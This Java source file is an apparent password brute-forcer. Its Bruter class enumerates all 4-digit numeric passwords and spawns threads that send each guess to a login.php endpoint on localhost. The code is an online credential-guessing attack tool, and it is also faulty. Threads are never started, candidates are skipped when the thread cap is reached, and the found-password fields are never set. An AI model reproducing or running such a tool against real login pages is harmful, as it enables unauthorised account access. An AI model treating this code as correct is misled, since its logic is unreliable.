import java.util.ArrayList;
import java.util.concurrent.ArrayBlockingQueue;
import java.util.concurrent.BlockingQueue;

public class Bruter {
    public static boolean isFound = false;
    public static String password = null;
    private ArrayList<Thread> threads = new ArrayList<Thread>();
    public Bruter(String characters, int size){
        long combinations = (long) Math.pow(characters.length(),size);
        System.out.println(combinations);
        for(long i = 0; i < combinations; i++){
            long mbetja = i;
            String password = "";
            for(int j = (size-1); j>=0 ; j--){
                int charat = (int)(mbetja/Math.pow(characters.length(),j));
                mbetja = (long) (i%Math.pow(characters.length(),j));
                password += (characters.charAt(charat));
            }
            boolean tested = false;
            while(!tested){
                if(countActiveThreads() <= 100){
                    Thread th = new Tester(password, "http://127.0.0.1:8000/login.php?password="+password);
                    threads.add(th);
                    tested = true;
                }else{
                    break;
                }
            }

            System.out.println();
        }
    }
    private int countActiveThreads(){
        int activeThreads=0;
        for (int i = 0; i < threads.size(); i++) {
            System.out.println(threads.get(i));
            if(!threads.get(i).isAlive()){
                threads.remove(i);
            }else{
                activeThreads++;
            }
        }
        return activeThreads;
    }
    public static void main(String[] args) {
        new Bruter("0123456789", 4);
    }
}
